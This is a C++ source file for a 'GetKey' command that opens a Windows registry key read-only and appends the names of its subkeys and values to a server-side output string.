#include "GetKey.h"

#define BUFF_SIZE 2048

GetKey::GetKey(const tstring &path) : path{path} {}

bool GetKey::execute() {

  tstring handleKeyString;
  GetRegistryHive(path, handleKeyString);

  HKEY handleKey = NULL;
  LSTATUS returnValue{};

  handleKey = GetHKEYByString(handleKeyString);

  std::unique_ptr<HKEY, void (*)(HKEY *)> hFind_ptr(&handleKey,
                                                    CloseRegKeyDeleter);
  CHECK_HANLE_KEY_RETURN(handleKey)

  returnValue = RegOpenKeyEx(handleKey, path.c_str(), 0, KEY_READ, &handleKey);

  CHECK_RETURN_VALUE_ERROR_SUCCESS(returnValue)

  DWORD nrOfSubKeys;
  DWORD nrOfSubValues;

  FILETIME ftLastWriteTime;

  returnValue = RegQueryInfoKey(handleKey, NULL, NULL, NULL,
                                &nrOfSubKeys, NULL, NULL, &nrOfSubValues, NULL, NULL,
                                NULL, &ftLastWriteTime);

  CHECK_RETURN_VALUE_ERROR_SUCCESS(returnValue)

  TCHAR subSubKeyName[BUFF_SIZE];
  DWORD subSubKeySize;

  if (nrOfSubKeys) {
    for (DWORD index = 0; index < nrOfSubKeys; index++) {

      subSubKeySize = BUFF_SIZE;

      returnValue = RegEnumKeyEx(handleKey, index, subSubKeyName, &subSubKeySize, NULL, NULL,
                                 NULL, &ftLastWriteTime);

      if (returnValue == ERROR_SUCCESS) {
        Server::AddCommandInString(subSubKeyName, _T("\n"));
      } else {
        Server::AddCommandInString(to_tstring(returnValue), _T("\n"));
      }
    }
  }

  TCHAR subKeyValue[BUFF_SIZE];
  DWORD subKeyValueSize;

  if (nrOfSubValues) {
    for (DWORD index = 0; index < nrOfSubValues; index++) {

      subKeyValueSize = BUFF_SIZE;
      subKeyValue[0] = _T('\0');

      returnValue = RegEnumValue(handleKey, index, subKeyValue, &subKeyValueSize, NULL,
                                 NULL, NULL, NULL);

      if (returnValue == ERROR_SUCCESS) {
        Server::AddCommandInString(_T(" "));
        Server::AddCommandInString(subKeyValue, _T("\n"));
      } else {
        Server::AddCommandInString(to_tstring(returnValue), _T("\n"));
      }
    }
  }
  return true;
}
